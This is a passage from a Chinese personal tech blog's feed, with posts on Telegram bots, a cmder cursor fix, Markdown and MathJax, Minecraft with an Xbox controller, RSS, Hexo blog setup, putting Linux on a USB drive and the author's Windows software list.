<li>telegram 中的表情包非常多，但是默认却是 webp 格式，如果想要在其他 IM 软件中使用就困难了，所以有了 <code>@Stickerdownloadbot</code>，你可以将某个 sticker 或整个 sticker pack 的链接发送给该 bot，以获取表情包的 jpg/png 图片。</li>
</ol>
<h2 id="视频音乐">视频音乐</h2>
<ol>
<li><code>@utubebot</code> 可用来下载 YouTube 的视频，并有多种格式分辨率选择。</li>
<li><code>@vid</code> 则可 inline 调用搜索 YouTube 视频。</li>
<li><code>@vkm_bot</code> 使用俄罗斯网站 VK 的源，可 inline 调用发送歌曲文件。</li>
</ol>
<h2 id="杂项">杂项</h2>
<ol>
<li><code>@TheFeedReaderBot</code> 是一个可用于订阅 RSS 的 bot，不过貌似会比较慢。</li>
<li><code>@MyTeleCloudBot</code> 则是一个什么都不会做的 bot，你可以向它发送任何东西，将其变成你的云盘。</li>
<li><code>to_kindle_bot</code> 是一个可用于给 kindle 推送的 bot，给 kindle 推送书变得更方便了，值得一提的是它能自动把 epub 文件转码。</li>
<li><code>GmailBot</code> 可用于给自己收发 Gmail。</li>
<li><code>@googletranslate_bot</code> 用来翻译，不过步骤挺繁琐的。</li>
<li><code>@bennyblog_bot</code> 可以用来查快递查美剧。</li>
<li><code>@wiki</code> 可以 inline 调用，发送 wikipedia 页面，更可指定语言。</li>
<li><code>@letmebot</code>: let me google it for you.</li>
<li><code>@codercalbot</code> 没事来算个命。</li>
</ol>
<hr>
<h2 id="后记">后记</h2>
<p>不得不吐槽 telegram 上的用户真是容易跑路。。一跑路有些 bot 就用不了了。。</p>
]]></content><category scheme="https://blog.batkiz.com/tags/telegram" term="telegram" label="telegram"/></entry><entry><title type="html">解决 cmder 光标问题</title><link href="https://blog.batkiz.com/posts/solving-cmder-space/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://blog.batkiz.com/posts/how-to-play-minecrafet-with-xbox-controller/?utm_source=atom_feed" rel="related" type="text/html" title="如何使用Xbox手柄玩Minecraft"/><link href="https://blog.batkiz.com/posts/software-on-my-computer/?utm_source=atom_feed" rel="related" type="text/html" title="我的电脑软件"/><id>https://blog.batkiz.com/posts/solving-cmder-space/</id><published>2018-06-16T22:07:53+00:00</published><updated>2018-06-16T22:07:53+00:00</updated><content type="html"><![CDATA[<h2 id="问题">问题</h2>
<p>由于 powershell 配置有些麻烦，所以最近在使用 cmder，然而在使用中有一个问题非常难受：
在 cmder 中，无论英文还是中文，输入的光标变宽或者多一个字符。</p>
<h2 id="解决方法">解决方法</h2>
<p>进入 <code>%CMDER_ROOT%\vendor</code> 文件夹，编辑 <code>profile.ps1</code>，寻找下列信息(<code>Ctrl + F</code>)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span style="color:#a6e22e">Microsoft.PowerShell.Utility\Write-Host</span> <span style="color:#a6e22e">&#34;`nλ</span> <span style="color:#a6e22e">&#34;</span> <span style="color:#a6e22e">-NoNewLine</span> <span style="color:#a6e22e">-ForegroundColor</span> <span style="color:#a6e22e">&#34;DarkGray&#34;</span>
</span></span></code></pre></div><p>将其中的 <code>λ</code> 改为 <code>#</code> 或其它字符即可。</p>
<hr>
<p>如果使用的是 cmd，则编辑 <code>clink.lua</code>，寻找</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> env <span style="color:#f92672">==</span> <span style="color:#66d9ef">nil</span> <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>    lambda <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;λ&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    lambda <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;(&#34;</span><span style="color:#f92672">..</span>env<span style="color:#f92672">..</span><span style="color:#e6db74">&#34;) λ&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span></code></pre></div><p>将其中的 <code>λ</code> 改为 <code>#</code> 或其它字符即可。</p>
]]></content><category scheme="https://blog.batkiz.com/tags/windows" term="windows" label="windows"/></entry><entry><title type="html">a-short-introduction-to-markdown</title><link href="https://blog.batkiz.com/posts/a-short-introduction-to-markdown/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/a-short-introduction-to-markdown/</id><published>2018-03-29T21:14:10+00:00</published><updated>2018-03-29T21:14:10+00:00</updated><content type="html"><![CDATA[<h2 id="markdown-是什么">markdown 是什么</h2>
<blockquote>
<p><strong>Markdown</strong> 是一种 <a href="https://zh.wikipedia.org/wiki/%E8%BD%BB%E9%87%8F%E7%BA%A7%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80" title="轻量级标记语言">轻量级标记语言</a>，创始人为 <a href="https://zh.wikipedia.org/wiki/%E7%B4%84%E7%BF%B0%C2%B7%E6%A0%BC%E9%AD%AF%E4%BC%AF" title="约翰·格鲁伯">约翰·格鲁伯</a>（英语：John Gruber）。它允许人们“使用易读易写的纯文本格式编写文档，然后转换成有效的 <a href="https://zh.wikipedia.org/wiki/XHTML" title="XHTML">XHTML</a>（或者 <a href="https://zh.wikipedia.org/wiki/HTML" title="HTML">HTML</a>）文档”。<a href="https://zh.wikipedia.org/wiki/Markdown#cite_note-md-4">[4]</a> 这种语言吸收了很多在 <a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6" title="电子邮件">电子邮件</a> 中已有的纯文本标记的特性。</p>
</blockquote>
<p>以上内容引自维基百科。</p>
<h2 id="基本语法">基本语法</h2>
<p>Google it and try yourself.</p>
<p>需要注意的是 markdown 的 “方言” 十分之多，可谓十里不同俗。
除知名的 GitHub Flavored Markdown 外，几乎每个编辑器都有着自己的 “方言”，望各位自行斟酌。</p>
<h2 id="mathjax">MathJax</h2>
<p>MathJax 便是一个在浏览器上显示 $\LaTeX$ 数学公式的 JavaScript 引擎，同样，有些编辑器支持，有些不支持，还有些是部分支持。</p>
<p>关于如何输入种种符号，如 $\int$，请自行寻找 $\LaTeX$ 相关知识。</p>
<p>下面是一些基本语法，请以 MathJax 的 <a href="https://math.meta.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference">官方手册</a> 为准。</p>
<p><code>$</code> 表示行内公式：</p>
<p>质能守恒方程 $E=mc^2$ 可以写作 <code>$E=mc^2$</code>。</p>
<p><code>$$</code> 表示整行公式，如</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-latex" data-lang="latex"><span style="display:flex;"><span><span style="color:#e6db74">$$</span>\sum_{i<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>}^n a_i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#e6db74">$$</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">$$</span>f<span style="color:#f92672">(</span>x_<span style="color:#ae81ff">1</span>,x_x,\ldots,x_n<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> x_<span style="color:#ae81ff">1</span>^<span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> x_<span style="color:#ae81ff">2</span>^<span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> \cdots <span style="color:#f92672">+</span> x_n^<span style="color:#ae81ff">2</span> <span style="color:#e6db74">$$</span>
</span></span></code></pre></div><p>会被渲染为</p>
<p>$$
\sum_{i=1}^n a_i=0
$$</p>
<p>$$f(x_1,x_x,\ldots,x_n) = x_1^2 + x_2^2 + \cdots + x_n^2 $$</p>
<h2 id="与-word-的不同">与 Word 的不同</h2>
<p>markdown 固然好用，但不要<strong>神化</strong>它 ——— 一个轻量的标记语言，与动辄几个 G 的 office 相比，还是极其羸弱的</p>
<h2 id="编辑器">编辑器</h2>
<p>请自行尝试并决定</p>
<h2 id="更多的扩展">更多的扩展</h2>
<p>诸如</p>
<ul>
<li>转 docx/pdf/html/etc.</li>
<li>做 ppt</li>
</ul>
<p>还望各位自行发掘。</p>
<hr>
<h2 id="refer">refer</h2>
<ul>
<li><a href="https://www.zybuluo.com/mdeditor">Cmd Markdown</a></li>
<li><a href="https://github.com/guodongxiaren/README">Github Flavored Markdown 语法介绍</a></li>
<li><a href="https://math.meta.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference">MathJax basic tutorial and quick reference</a></li>
</ul>
]]></content></entry><entry><title type="html">如何使用Xbox手柄玩Minecraft</title><link href="https://blog.batkiz.com/posts/how-to-play-minecrafet-with-xbox-controller/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://blog.batkiz.com/posts/software-on-my-computer/?utm_source=atom_feed" rel="related" type="text/html" title="我的电脑软件"/><id>https://blog.batkiz.com/posts/how-to-play-minecrafet-with-xbox-controller/</id><published>2018-03-06T15:23:26+00:00</published><updated>2018-03-06T15:23:26+00:00</updated><content type="html"><![CDATA[<p>前几天入手了一个 Xbox one 手柄，拿来 van ♂ 游戏，育碧的刺客信条原生滋瓷手柄，感觉不错。
<strong>但</strong> Java 版 Minecraft 却并未支持手柄，虽然 Minecraft for Windows 10 对手柄原生支持，但可惜我要玩的是我们自行搭建的 mod 服。因此只好寻求其他方法。</p>
<h2 id="被枪毙的方案">被枪毙的方案</h2>
<ul>
<li>mod
在搜寻过程中，有人称该 mod 已不再更新，且 bug 较多，因此不予考虑。</li>
<li>Xpadder 等映射软件
需要使用第三方软件，稳定性堪忧，且需自行调整键位。</li>
</ul>
<h2 id="最终方案">最终方案</h2>
<p>好在一位朋友找到了油管上一位小哥上传的<a href="https://www.youtube.com/watch?v=IGVLNBWMmyU">视频</a>，问题终于得以解决。
为方便各位不想看或不能看的，我将方法写在下面。</p>
<h3 id="步骤">步骤</h3>
<ol>
<li>打开 steam，进入库中添加本地游戏，快捷方式或自行寻找文件请随意。</li>
<li>点击右上角 🎮 图标，进入大屏幕模式。</li>
<li>而后对 Minecraft 进行单独设置为模拟键鼠模式。</li>
<li>在 steam 中打开 Minecraft。</li>
</ol>
<p>enjoy it! :)</p>
<hr>
<p>既然是模拟键鼠，那体验肯定是比不上 Windows 10 版原生支持的体验的。但总比没有强= =</p>
<hr>
<p>2018 年八月更新：
买了个基岩版 MC，手柄体验完美！</p>
]]></content><category scheme="https://blog.batkiz.com/tags/game" term="game" label="game"/><category scheme="https://blog.batkiz.com/tags/windows" term="windows" label="windows"/></entry><entry><title type="html">RSS，今日头条与信息爆炸</title><link href="https://blog.batkiz.com/posts/rss-is-best/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/rss-is-best/</id><published>2018-03-04T19:31:44+00:00</published><updated>2018-03-04T19:31:44+00:00</updated><content type="html"><![CDATA[<blockquote>
<p>献给 Aaron Swartz
本文具有极其严重的个人主观性</p>
</blockquote>
<p>在知乎上一个关于 RSS 的<a href="https://www.zhihu.com/question/19580096/answer/20490041">回答</a>上，回答者写道：“支持 RSS 是一种美德”。
RSS 是什么在此不再赘述。那么，为何支持 RSS 是一种美德呢？
<del>吹 RSS 警告</del></p>
<h2 id="背景">背景</h2>
<p>毋庸置疑，现在是一个<strong>信息爆炸</strong>的时代，各种我们需要的不需要的信息充斥每个人。同时，人们对于新闻也越来越不信任——反转，辟谣，阴谋论。
互联网及自媒体的崛起也对新闻行业产生了冲击：</p>
<ul>
<li>社交网络能在时间发生后的极短时间内将新闻通过网络传及全球，时效性惊人，遑论专用于此的 bot 已经出现。</li>
<li>大部分自媒体则以流量为导向，一方面造成了“震惊体”这种哗众取宠之物，另一方面则使事件愈发扑朔迷离，诸如汤兰兰案、比利·海灵顿之死。媒体的公信力不断降低。</li>
</ul>
<p>在 1948 年，<a href="https://zh.wikipedia.org/wiki/%E5%85%8B%E5%8A%B3%E5%BE%B7%C2%B7%E8%89%BE%E5%B0%94%E4%BC%8D%E5%BE%B7%C2%B7%E9%A6%99%E5%86%9C">香农</a>将热力学的熵，引入到信息论，即“<strong>信息熵</strong>”。</p>
<p><strong>一条信息消除的不确定性越大（即熵减越大），它蕴含的信息量越大。<strong>显然，虽然我们每天都摄入着很多信息，但大部分都是对</strong>消除不确定性</strong>毫无益处，我们所得到的有用的信息极少。</p>
<p>因此，RSS 变得愈发必要。</p>
<h2 id="为什么是-rss">为什么是 RSS</h2>
<h3 id="rss-的优点">RSS 的优点</h3>
<ol>
<li>聚合：将所有信息聚集在一处，不必打开浏览器检查一个个网站。</li>
<li>高效：维护好一份 RSS 配置，能使自己获取信息更为高效。</li>
<li>干净：你不会被绑架，你不会看到广告，不会看到如今被烂梗、撕*以及其他卖片儿的所占领的评论。</li>
<li>克制：一旦你看完列表中的文章，就能关掉 RSS 阅读器，避免了沉迷刷新闻导致的时间被浪费。</li>
<li>能获得更广阔的信息源：很多技术博客实际上是没有 app 承载内容的，但是却支持 RSS。</li>
</ol>
<h3 id="为什么不用今日头条">为什么不用今日头条</h3>
<p>原因大概如下：</p>
<ol>
<li>容易被平台所绑架。</li>
<li>劣质的新闻源，以及洗稿、抄袭严重。</li>
<li>丧失了“看点不一样的东西”的权利。（仅就 timeline 而言）</li>
<li>极易浪费时间。</li>
</ol>
<h2 id="rss-已死">“RSS 已死”</h2>
<p>Google reader 业已关闭，抓虾、鲜果也都早已停止服务，各个新闻网站也都在搞着自己的 app，对 RSS 也都早已停止了支持。难道说 RSS 就这样死了么？</p>
<p><strong>不。</strong></p>
<p>仍有大量的网站在支持着 RSS，RSS 阅读器也并未萎靡不振。而 RSS 作为一种完全开放的协议，是与互联网开放、互联的大势一致的。大势不变，此路不死。当然会与时俱进，也许要改头换面，但不会死亡。</p>
<h2 id="rss-reader">RSS reader</h2>
<h3 id="windows-10">Windows 10</h3>
<p>对 Windows 10 用户，个人推荐<a href="https://www.microsoft.com/zh-cn/store/p/newsflow/9nblggh58s5r">Newsflow</a>。
尽管其有诸多缺点，如刷新时间过长，对引用、代码区块不支持，偶尔图片加载不出来，但其仍是一款足够优秀的 UWP RSS 阅读器。</p>
<h3 id="android">Android</h3>
<p>虽然即刻并没有把自己当作 RSS 阅读器来宣传，但个人认为其足以作为一款优秀的 RSS 阅读器。</p>
<p>最重要的是，其能用来关注一些传统的 RSS 所无能为力的源——比如微信公众号。</p>
<p><em>早期即刻曾开放过 RSS 机器人，但后来因某些原因下线了。不过很多源早已在功能下线前被用户设立。</em></p>
]]></content><category scheme="https://blog.batkiz.com/tags/rss" term="rss" label="RSS"/></entry><entry><title type="html">hexo blog</title><link href="https://blog.batkiz.com/posts/hexo-blog/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/hexo-blog/</id><published>2018-02-10T20:46:23+00:00</published><updated>2018-02-10T20:46:23+00:00</updated><content type="html"><![CDATA[<p>本文为在 Manjaro 系统下对 hexo 博客搭建的复现。
另，由于文章存在时效性，本文只作为参考，实际应以<a href="https://hexo.io/zh-cn/docs/index.html">Hexo 官方文档</a>为准。<del>这也正是我写这篇文章的原因=。=</del></p>
<h2 id="准备工作">准备工作</h2>
<h3 id="git">Git</h3>
<blockquote>
<p><strong>git</strong> 是一个<a href="https://zh.wikipedia.org/wiki/%E5%88%86%E6%95%A3%E5%BC%8F%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6" title="分布式版本控制">分布式版本控制</a>软件，最初由<a href="https://zh.wikipedia.org/wiki/%E6%9E%97%E7%BA%B3%E6%96%AF%C2%B7%E6%89%98%E7%93%A6%E5%85%B9" title="林纳斯·托瓦兹">林纳斯·托瓦兹</a>（Linus Torvalds）创作，于 2005 年以<a href="https://zh.wikipedia.org/wiki/GPL" title="GPL">GPL</a>发布。最初目的是为更好地管理<a href="https://zh.wikipedia.org/wiki/Linux%E5%86%85%E6%A0%B8" title="Linux内核">Linux 内核</a>开发而设计。</p>
</blockquote>
<p>这里是<a href="http://git-scm.com/">Git 官网</a>，你可以在其中获取安装文件。当然你也可以用<code>apt</code>，<code>yum</code>或<code>pacman</code>等包管理工具来安装。
推荐顺带配置一下用户信息（及 ssh），以避免过程中频繁输入用户名与密码。</p>
<h3 id="nodejs">nodejs</h3>
<blockquote>
<p><strong>Node.js</strong>是一个能够在服务器端运行<a href="https://zh.wikipedia.org/wiki/JavaScript" title="JavaScript">JavaScript</a>的<a href="https://zh.wikipedia.org/wiki/%E9%96%8B%E6%94%BE%E5%8E%9F%E5%A7%8B%E7%A2%BC" title="开放源代码">开放源代码</a>、<a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E5%B9%B3%E5%8F%B0" title="跨平台">跨平台</a>JavaScript<a href="https://zh.wikipedia.org/wiki/%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83" title="执行环境">运行环境</a>。Node.js 由 Node.js 基金会持有和维护<a href="https://zh.wikipedia.org/wiki/Node.js#cite_note-3">[3]</a>，并与<a href="https://zh.wikipedia.org/wiki/Linux%E5%9F%BA%E9%87%91%E6%9C%83" title="Linux基金会">Linux 基金会</a>有合作关系<a href="https://zh.wikipedia.org/wiki/Node.js#cite_note-4">[4]</a>。</p>
</blockquote>
<p>同上，你可以在<a href="https://nodejs.org/">nodejs 官网</a>或包管理工具中安装 nodejs。值得一提的是，apt 仓库中的 nodejs 版本过老，不推荐通过 apt 安装。</p>
<h3 id="github-账号">Github 账号</h3>
<p><del>全球最大的同性交友网站上线啦，性感开发者在线发源码</del>
<img src="http://pic4.zhimg.com/80/7c9d3403bf922b1663f56975869c829b_hd.jpg" alt="没毛病"></p>
<p>hexo 博客使用的是 Github 提供的 GitHub pages 服务，因此一个 GitHub 账号必不可少<del>当然你也可以选择 gitee 或者 coding.net</del></p>
<h2 id="开始">开始</h2>
<p>打开 terminal(*nux 下)或者 cmd(Windows 下，记得使用管理员权限打开)。
接着一路<code>cd</code>到你想要存放本地博客文件的目录。
下面按照 hexo 官方文档执行<code>npm install -g hexo-cli</code>。
<strong>*unix 下请使用<code>root</code>权限执行，否则会出现错误。</strong>
而后执行</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hexo init &lt;folder&gt;
</span></span><span style="display:flex;"><span>cd &lt;folder&gt;
</span></span><span style="display:flex;"><span>npm install
</span></span></code></pre></div><p><code>&lt;folder&gt;</code>为文件夹的名字，可以随意。
接下来请<code>npm install hexo-deployer-git --save</code>，这是用于向 Github 部署用的插件。</p>
<h2 id="配置">配置</h2>
<p>这里主要是对<code>_config.yml</code>的更改</p>
<p>诸如 title、description 等看描述自己填就行了，这里只说些需要注意的。</p>
<ul>
<li><code>language</code>项，如非主题要求尽量留空，否则会发生一些奇奇怪怪的 bug，另外简体中文也有<code>zh-CN</code>与<code>zh-Hans</code>两种描述，请按主题提供的文档来填写。</li>
<li><code>timezone</code>项同上，建议留空。</li>
<li>由于我们使用的是 GitHub 的服务，因此<code>url</code>项应该是<code>https://username.github.io</code>，<code>username</code>是你自己的 GitHub 用户名，需要注意的是**<code>https</code>**。</li>
<li><code>deploy</code>项应形如</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#f92672">deploy</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">type</span>: <span style="color:#ae81ff">git</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">repo</span>: <span style="color:#ae81ff">&lt;git-source&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">branch</span>: <span style="color:#ae81ff">master</span>
</span></span></code></pre></div><ul>
<li><code>repo</code>项可以用 ssh 或者 https，视个人情况而定</li>
</ul>
<h2 id="更多">更多</h2>
<h3 id="主题">主题</h3>
<p>首选参考<a href="https://hexo.io/themes/">官方主题页面</a>
个人推荐下面几个</p>
<ul>
<li><a href="https://www.haomwei.com/technology/maupassant-hexo.html">maupassant</a></li>
<li><a href="https://www.haomwei.com/technology/maupassant-hexo.html">material</a></li>
<li><a href="https://github.com/iissnan/hexo-theme-next">next</a></li>
</ul>
<p>更多的可以自己找~</p>
<p>主题中也有<code>_config.yml</code>文件用于配置，可以参考注释或者官方文档来填写，不一而足。在此不作探讨</p>
<h3 id="更多玩法">更多玩法</h3>
<ul>
<li>独立域名</li>
<li><a href="https://github.com/hexojs/hexo-generator-feed">RSS</a></li>
<li>…………</li>
</ul>
<h2 id="hexo-的命令">hexo 的命令</h2>
<p>同样的，应以<a href="https://hexo.io/zh-cn/docs/">官方文档</a>为准，这里说几个常用的。</p>
<ul>
<li><code>hexo new [layout] &lt;title&gt;</code>，<code>[layout]</code>可不写，<code>&lt;title&gt;</code>即为文章名称。</li>
<li><code>hexo clean</code>，清除已生成的静态文件，推荐在每次更新时执行一次。</li>
<li><code>hexo g</code>，即<code>generate</code>，将写出的 markdown 文档渲染为博客中的文件。</li>
<li><code>hexo s</code>，生成本地预览，用以检查。默认地址为<code>http://localhost:4000</code>，如果发生错误可以检查一下<code>4000</code>端口是不是被占用了。</li>
<li><code>hexo d</code>，部署到远程仓库。</li>
</ul>
<h2 id="写在最后">写在最后</h2>
<p>既然这玩意是搞的博客，就要记住博客最重要的还是内容，而非花里胡哨的东西，适度折腾。
希望大家都能持续输出优质内容~</p>
]]></content><category scheme="https://blog.batkiz.com/tags/hexo" term="hexo" label="hexo"/></entry><entry><title type="html">将linux装入u盘之路</title><link href="https://blog.batkiz.com/posts/install-linux-in-upan/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/install-linux-in-upan/</id><published>2017-12-21T20:11:01+00:00</published><updated>2017-12-21T20:11:01+00:00</updated><content type="html"><![CDATA[<p><del>别名：a day wasted</del></p>
<p>因为这事浪费了我一天时间，我觉得还是有必要写篇文章警醒后来人的（</p>
<h2 id="起因">起因</h2>
<p><del>一时兴起啊</del>
前几天有个群里有人想把 Windows 装入 u 盘，加之起了一个“做个系统随身带着岂不是美滋滋”的想法，今天早上着手制作。</p>
<h2 id="过程">过程</h2>
<h3 id="linuxlive-usb-creater">LinuxLive USB Creater</h3>
<p><img src="http://www.linuxliveusb.com/images/stories/logos/LogoText.png" alt="LiLi">
这么一个不好做的事，当然是事先找了很多资料的~
于是在一个知乎回答里看到推荐了<a href="http://www.linuxliveusb.com/">LinuxLive USB Creater</a>，便去试了试，打开官网，按捺住吐槽这炫目的 Logo、古老的界面的冲动，先试了试。
过程不外乎选择镜像文件、u 盘之类。值得一提的是如果你勾选的话，其会自动下载一个 vbox portable 到你的 u 盘中。
安装后，根据官方文档，启动<code>Virtualize_This_Key.exe</code>，然而不行；重启也是不行。
<strong>方案枪毙</strong></p>
<h3 id="rufus">Rufus</h3>
<p><a href="https://rufus.akeo.ie/?locale=zh_CN">Rufus</a>是一个非常好用的创建 usb 启动盘的工具。其作者对于捐赠的态度也极其令人敬佩</p>
<blockquote>
<p>这个问题老是有人问我，不过这个页面上真的 <strong>没有</strong> 捐助按钮。
主要原因是我认为捐助模式不能真正帮助软件发展，相反的，会对没有捐助的用户产生一种无意的诱导性的愧疚歧视感。
当然，如果你非要坚持，你可以捐给 <a href="http://www.fsf.org/">Free Software Foundation（自由软件基金会）</a>，他们才是无数类似 Rufus 的软件得以存在的原因。
不管如何，我都要在此对你们说 <em>谢谢你们</em> 对这个小程序持续的支持和热情：非常非常感谢。
但是无论怎样也请你随意使用 Rufus ，无需介怀对此项目没有付出任何经济上的贡献 – 因为你本来就不需要嘛。</p>
</blockquote>
<p><del>但这不是我们的重点</del>照例把<code>iso</code>镜像烧录进 u 盘，而后设置电脑从 u 盘启动。
显然这是无济于事的（，在再次尝试了一番 elementary os 并再次认为其好看后，便开始寻找下一个解决方案
<del>如果我还有一个 u 盘的话应该是可以把系统安装进 u 盘的，可惜我没有</del></p>
<h3 id="deepin-boot-maker--universal-usb-installer">deepin boot maker &amp; universal USB installer</h3>
<p>和 Rufus 基本是一类软件，不作赘述：<strong>没卵用</strong></p>
<h3 id="deepin-system-installer">deepin system installer</h3>
<p>在下载<em>deepin boot maker</em>时看到了这个，本着“装个 deepin 也不是不可以”的心态下载了它。
然后发现…………这货只能把系统装进 C 盘！<del>玩蛋去吧！</del></p>
<h3 id="arch-anywhere">arch-anywhere</h3>
<p><img src="https://arch-anywhere.org//images/anarchy-linux-icon.png" alt="anarchy linux">
又名<code>anarchy linux</code>，logo 还挺好看。
<a href="https://arch-anywhere.org/">这个玩意</a>，arch 也是一个我非常想尝试的发行版，因此寻思着装个 arch 也不是不可以，除了有点担心太久不用 u 盘的系统更新会滚挂之外，我还是持乐观态度的。
然而…………烧录进 u 盘后设置电脑从 u 盘启动</p>
<ul>
<li>在用的这台电脑显示挂载失败</li>
<li>旧电脑一直连不上网</li>
</ul>
<p>不得已，只能把这个也放弃了。</p>
<h3 id="vmware">vmware</h3>
<p>最开始时就看到<a href="https://zhuanlan.zhihu.com/p/23094344">这篇文章</a>了，一直不想用。
最开始我是打算用 vbox 的，可是操作完全不同=。=又下载安装了 VMware。
教程倒是不复杂，可是在更改硬盘为 u 盘后一直显示无操作系统= =
无奈之下又一个方案宣告破产</p>
<h3 id="puppy-linux">puppy linux</h3>
<p>网址就不贴了，界面有上古遗风，论坛之类的看起来也很久没人维护了。
简易尝试之后果断放弃。</p>
<h3 id="slax-linux">Slax linux</h3>
<p><img src="http://www.slax.org/en/images/clover.png" alt="Slax linux">
界面和 win8 有点像，安装方式与众不同（直接从 iso 文件解压然后运行批处理文件）。
目测好像不能在 efi 下启动，改天在旧电脑上试试。</p>
<h2 id="结语">结语</h2>
<p><del>别 xjb 心血来潮</del>
作死有风险~也希望对后来者有些帮助。</p>
<hr>
<h2 id="2018-年最新进展">2018 年最新进展</h2>
<p>最近要准备期末，蓦然发现还有个课没看，奈何只能用 android 手机，便寻思找个模拟器。
然后顺藤摸瓜又看了看<a href="http://www.phoenixos.com"><code>phoenix os</code></a>，发现能装到 u 盘里，试了试竟然真的成了（
<del>不过以我 U 盘羸弱的性能估计是凉了</del>
还没试验，就这样吧。</p>
<p>以上</p>
]]></content><category scheme="https://blog.batkiz.com/tags/linux" term="linux" label="linux"/></entry><entry><title type="html">我的电脑软件</title><link href="https://blog.batkiz.com/posts/software-on-my-computer/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/software-on-my-computer/</id><published>2017-11-01T07:40:44+00:00</published><updated>2017-11-01T07:40:44+00:00</updated><content type="html"><![CDATA[<p>时隔多时，我终于要从 Linux 平台回归 Windows，回想一番，把自己将要用的软件于此汇总一下。</p>
<p>也算是给自己一个备份归档。</p>
<h2 id="浏览器">浏览器</h2>
<h3 id="vivaldihttpsvivaldicom"><a href="https://vivaldi.com">Vivaldi</a></h3>
<p>一款来自 opera 浏览器创始人的浏览器
我一直在使用的浏览器，美观简洁，十分好用，标签组功能非常赞
chromium 内核，支持扩展~~(没用过就是了)~~
2018-3-2 update: 添加了云同步的功能，完美！
<img src="https://s1.ax1x.com/2017/12/14/qolUe.png" alt="qolUe.png"></p>
<h3 id="chrome">Chrome</h3>
<p>Google 出品，掌握特殊上网姿势后云同步十分好用</p>
<h3 id="edge">Edge</h3>
<p>🚀UWP
Windows 10 预置浏览器
渲染内核反人类，为什么非要等到载入完成才渲染啊喂！</p>
<h3 id="firefox">Firefox</h3>
<p><del>（三大神兽集齐了</del>
主要用来做题用（CTF)。</p>
<h2 id="下载">下载</h2>
<h3 id="fdm">FDM</h3>
<p>简洁美观的下载工具，还不限速，可惜不滋磁 ed2k 链接。</p>
<h3 id="迅雷极速版">迅雷极速版</h3>
<p>修改版的，完全绿色，可以用来下载磁力。（FDM 的磁力功能有够差的</p>
<h3 id="dpdownload"><del>dpdownload</del></h3>
<h3 id="baidupcs-go">baidupcs-go</h3>
<p>一个借由命令行操作的百度云工具</p>
<h3 id="netspeedmonitor">NetSpeedMonitor</h3>
<p>实时查看当前网速的，直接作为任务栏插件显示，美观了不少
不能自动切换网线和 WiFi 就很难受</p>
<h2 id="播放器">播放器</h2>
<h3 id="zplayer-uwp">zPlayer UWP</h3>
<p>🚀UWP
采用 vlc 的解码器，Fluent Design 界面，颜值爆表
<em>现在需要付费了（</em><del>好像不定时有限免活动</del></p>
<h3 id="网易云音乐">网易云音乐</h3>
<p>🚀UWP
良心的音乐软件，虽然最近以来因为版权饱受诟病，但还是能用的
私人 FM 的推荐还可以
<del>满级遥遥无期</del></p>
<h3 id="spotify">Spotify</h3>
<p>辣鸡网易云曲库</p>
<h3 id="灵音播放器">灵音播放器</h3>
<p>与网易云搭配使用
不多解释，非常好用，能用来下载些歌曲
字体渲染有问题= =，桌面歌词看着好糊</p>
<h3 id="哔哩哔哩动画-uwp">哔哩哔哩动画 UWP</h3>
<p>🚀UWP
逍遥橙子版的，偶尔看看动漫还有视频，比官方版体验好得多
与网页版各有千秋吧（</p>
<h3 id="groove-音乐">Groove 音乐</h3>
<p>🚀UWP
Fluent Design，界面是真的好看！！！
当个本地播放器完全够用了=。=</p>
<h3 id="grover-podcast">Grover Podcast</h3>
<p>🚀UWP
播客应用，用来听播客（
界面美观，堪称 Windows 下坠吼的播客应用，不过 Windows 10 mobile 下只有付费版就很难受（</p>
<h3 id="gleehttpsgithubcomnondaneeglee"><a href="https://github.com/nondanee/Glee">Glee</a></h3>
<p>&ldquo;最好的网易云音乐客户端&quot;之一
